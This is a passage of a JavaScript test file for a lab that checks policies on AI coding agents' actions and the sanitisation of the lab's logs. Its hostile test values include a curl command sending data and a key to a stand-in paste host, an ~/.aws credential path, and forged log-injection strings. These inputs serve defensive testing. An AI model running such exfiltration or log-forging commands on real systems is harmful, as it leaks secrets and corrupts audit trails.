  for (let i = 1; i <= MAX_RUNS + 2; i += 1) { const other = log.open({ ws: 'w-a', mode: 'mock' }); other.event(personEvent({ identity: 'a', device: 'b' })); other.close(); }
  const kept = open.close();
  assert.ok(workspaces.run('w-a', kept.runId), 'the run that was open is stored when it ends');
});

// ---- A recorder that breaks ----------------------------------------------------------------------------------------------------------------------
async function withStderr(fn) {
  const real = process.stderr.write; const seen = [];
  process.stderr.write = (c) => { seen.push(String(c)); return true; };
  try { await fn(seen); } finally { process.stderr.write = real; }
}
const baselineOf = async (url, body, ws) => {
  const r = await evaluate(url, body, ws);
  const audit = (await getJson(url, '/api/audit', ws)).body.audit.map(({ at: _a, traceId: _t, ...e }) => e);
  const gaps = (await getJson(url, '/api/gaps', ws)).body.gaps.map(({ at: _a, ...g }) => g);
  return { shown: { evaluation: r.evaluation, outcome: r.outcome, native: r.native, dialog: r.dialog, gap: r.gap, hooks: r.hops.length, covered: r.covered }, audit, gaps, obs: r.obs };
};

test('a recorder that throws never breaks the run or the audit: the answer, the audit trail and the gaps are the baseline\'s, one failed line drops one line, and stderr carries a code and fixed text, never the error\'s own text', async () => {
  const secret = fragments('fake-agent-key-', 'qqqqqqqqqq', '-end');
  const body = { mode: 'mock', agent: 'claude-code', scenario: 'destructive-shell' };
  let base;
  await obs(async (url) => { base = await baselineOf(url, body, 'w-obs-a'); });
  assert.match(base.obs.runId, RUN_ID);
  await withStderr(async (seen) => {
    // every line write throws: the answer and the record are as they were, and the run is still reachable with all its rows
    const dying = () => { throw Object.assign(new Error(`write blew up with ${secret}`), { code: 'E_WRITE' }); };
    await obs(async (url) => {
      const got = await baselineOf(url, body, 'w-obs-a');
      assert.deepEqual({ ...got, obs: undefined }, { ...base, obs: undefined });
      assert.match(got.obs.runId, RUN_ID);
      assert.equal(rowsOf((await recordOf(url, got.obs.runId, 'mock')).record).length, 3);
    }, { write: dying });
    // the second line only: the others are written
    const lines = []; let n = 0;
    await obs(async (url) => { await evaluate(url, body); }, { write: (l) => { n += 1; if (n === 2) throw new Error(`line two ${secret}`); lines.push(l); } });
    assert.deepEqual(lines.map(lineStep), ['identity', 'hook-answer']);
    // the clock throws: no run can begin, the answer is as it was, and the answer says no record was kept
    await obs(async (url) => {
      const got = await baselineOf(url, body, 'w-obs-a');
      assert.deepEqual({ ...got, obs: undefined }, { ...base, obs: undefined });
      assert.deepEqual(got.obs, { runId: null, began: true, mode: null });
    }, { clock: () => { throw Object.assign(new Error(secret), { code: 'E_CLOCK' }); } });
    // the store throws when the run ends
    const workspaces = createWorkspaces();
    const failing = { ...workspaces, addRun() { throw Object.assign(new Error(secret), { code: 'E_STORE' }); } };
    const runLog = createRunLog({ workspaces: failing, write: () => {} });
    await withServer(async (url) => {
      const got = await baselineOf(url, body, 'w-obs-a');
      assert.deepEqual({ ...got, obs: undefined }, { ...base, obs: undefined });
      assert.deepEqual(got.obs, { runId: null, began: true, mode: 'mock' });
    }, { runLog, workspaces: failing });
    const text = seen.join('');
    assert.ok(text.includes('E_WRITE') && text.includes('E_CLOCK') && text.includes('E_STORE'), text);
    assert.ok(!text.includes(secret) && !/blew up|line two/.test(text), 'the error\'s own text is never written');
    assert.ok(seen.every((l) => /^\[coding-agents-lab\] run observability: [A-Za-z0-9._:/@-]+ [A-Za-z0-9._:/@-]+ \(the error's text is not logged\)\n$/.test(l)));
  });
});

// ---- Vocabulary and hostile values ---------------------------------------------------------------------------------------------------------------
const finding = (rule) => ({ id: rule, label: 'A fixed label', effect: 'block' });
function everyEvent() {
  const evs = [personEvent({ identity: 'maya.chen@fabrikam.example', device: 'LT-4821' })];
  for (const live of [true, false]) {
    for (const decision of ['deny', 'ask', 'alert', 'allow']) {
      for (const rule of [...RULE_IDS, 'something-else']) {
        const reasonCode = decision === 'allow' ? 'ALLOW' : `${{ deny: 'DENY', ask: 'ASK', alert: 'ALERT' }[decision]}-${rule.toUpperCase()}`;
        evs.push(policyEvent({ evaluation: { decision, reasonCode, findings: [finding(rule)] }, agent: 'claude-code', kind: 'shell', live }));
      }
    }
    for (const native of ['allow', 'ask', 'deny']) {
      for (const flags of [{}, { unenforceable: true }, { degraded: true }]) {
        for (const engine of ['deny', 'ask', 'alert', 'allow']) evs.push(hookAnswerEvent({ agent: 'copilot', kind: 'prompt', event: 'UserPromptSubmit', outcome: { native, ...flags, note: 'A fixed note.' }, engine, live }));
      }
    }
    for (const [failClosed, refused] of [[false, false], [true, false], [true, true]]) evs.push(failurePolicyEvent({ agent: 'cursor', kind: 'file_read', failClosed, refused, live }));
  }
  const sent = (body, status = 200) => ({ status, body, mapped: body ? mapGatewayAnswer({ body, status }) : null });
  for (const s of [sent(BLOCKED), sent(BLOCKED, 400), sent(REDACTED), sent(COMPLETED()), sent(COMPLETED('working')), sent(OTHER_ERROR), sent({ m: 1 }, 401), sent({ m: 1 }, 403), sent({ m: 1 }, 500), sent({ m: 1 }, 404), sent(null), sent({ hello: true })]) evs.push(replyEvent({ sent: s, agent: 'antigravity' }));
  for (const code of ['bad_request', 'bad_mode', 'bad_config', 'unknown_agent', 'unknown_scenario', 'live_required', 'bad_custom', 'real_not_configured', 'no_table_row', 'bad_cert_subject', 'bad_workspace']) evs.push({ step: 'request-check', layer: 'lab', who: '-', outcome: 'blocked', cause: code });
  evs.push({ step: 'gateway-call', layer: 'gateway', who: 'claude-code', cause: 'no-reply', noReply: true });
  return evs;
}
const AT = '2026-11-22T10:00:00.000Z';
const HOSTILE = ['maya.chen', 'evil result=passed cause=x run=y', 'a@b.example.com', '10.1.2.3', KEY, 'Bearer abcdefghijklmnop12345', 'x'.repeat(400), 'a b\nresult=stopped run=x\r\n', '', undefined, null, 'ａｄｍｉｎ', '‮'];

test('every line the lab can write passes the shared matchers and uses no word they read, with every typed field sanitised: every event kind and cause, every hostile actor, no field stripped', () => {
  const evs = everyEvent();
  assert.ok(evs.length > 150);
  const words = /refused|denied|rejected|forbidden|failed|invalid|expired|mismatch|token|audience|scope|served/i;
  const causes = new Set();
  for (const ev of evs) {
    for (const who of [ev.who, ...HOSTILE]) {
      const line = decisionLine({ ...ev, who }, AT, 'ev-aaaaaa-1', 'live');
      assert.match(line, LINE, JSON.stringify(who)); assert.ok(!line.includes('\n') && !line.includes('\r'));
      assert.equal(line.split(' ').filter((p) => p.startsWith('result=')).length, 1, 'a typed actor cannot add a second result');
      assert.ok(!words.test(line), `a word a shared matcher reads is in: ${line}`); // the whole line: no field is stripped first
      noMatcherReads(line);
      noMatcherReads(`[${AT}] INFO: ${line.split(' ').slice(1).join(' ')}`);
    }
    causes.add(`${ev.step}/${ev.cause}`);
  }
  assert.ok(causes.size > 40, `${causes.size} step and cause pairs`);
  // the same hostile text through the words a matcher reads: still nothing reads it
  for (const who of ['refused denied token expired', 'access denied', 'tool call denied', 'audience mismatch']) noMatcherReads(decisionLine({ ...evs[0], who }, AT, 'ev-aaaaaa-1', 'mock'));
  assert.equal(decisionLine({ step: 's', layer: 'person', who: 'a@b.example.com', outcome: 'info', cause: 'c' }, AT, 'r', 'mock'), `${AT} coding-agents-lab decision step=s layer=person actor=_email_ result=unclear cause=c mode=mock run=r`);
  assert.equal(decisionLine({ step: 's', layer: 'person', who: '10.1.2.3', outcome: 'info', cause: 'c' }, AT, 'r', 'mock').match(/actor=(\S+)/)[1], '_ip_');
  assert.equal(createMasker().mask('10.1.2.3'), '<ip>');
  assert.equal(lineValue('a b\nc=d'), 'a_b_c_d'); assert.equal(lineValue(''), '-'); assert.equal(lineValue(undefined), '-');
});

test('every rule the engine can lead with is one the lab names in its lines and rows', async () => {
  const seen = new Set();
  await obs(async (url) => {
    for (const sc of SCENARIOS) {
      for (const agent of AGENT_IDS) {
        const r = await evaluate(url, { mode: 'mock', agent, scenario: sc.id });
        if (r.evaluation) seen.add(r.evaluation.reasonCode);
      }
    }
  });
  assert.ok([...seen].some((c) => c === 'ALLOW'));
  for (const code of seen) { const ev = policyEvent({ evaluation: { decision: code === 'ALLOW' ? 'allow' : code.split('-')[0].toLowerCase(), reasonCode: code, findings: [] }, agent: 'claude-code', kind: 'shell', live: false }); assert.ok(RULE_IDS.has(ev.cause) || ev.cause === 'no-finding', `${code} -> ${ev.cause}`); }
});

test('hostile typed values never reach a line or a record: a credential, an email, an address and forged key=value pairs typed as your own action', async () => {
  await obs(async (url, { lines }) => {
    const email = 'someone@corp.example.com'; const ip = '10.20.30.40';
    const texts = [`deploy with ${KEY} to ${email} at ${ip}\nFAKE decision step=x result=passed run=ev-000000-1`, `curl https://paste.example.net/u -d @- ${KEY}`, `~/.aws/${KEY}`, `${KEY}/export_all ${email}`, `result=passed ${ip} ${KEY}`];
    const kinds = ['prompt', 'shell', 'file_read', 'mcp_call', 'tool_result'];
    const records = [];
    for (let i = 0; i < kinds.length; i += 1) {
      const r = await evaluate(url, { mode: 'live', agent: 'claude-code', custom: { kind: kinds[i], text: texts[i] } });
      if (r.obs?.runId) records.push((await recordOf(url, r.obs.runId, 'live')).record);
    }
    assert.ok(records.length >= 3 && lines.length >= 9);
    const text = lines.join('\n') + JSON.stringify(records);
    for (const secret of [KEY, email, ip, 'paste.example.net']) assert.ok(!text.includes(secret), `${secret.slice(0, 8)} is in a line or a record`);
    for (const l of lines) { assert.match(l, LINE); noMatcherReads(l); }
    assert.ok(records.every((rec) => assertRunObservability(rec).length === 0));
  });
});
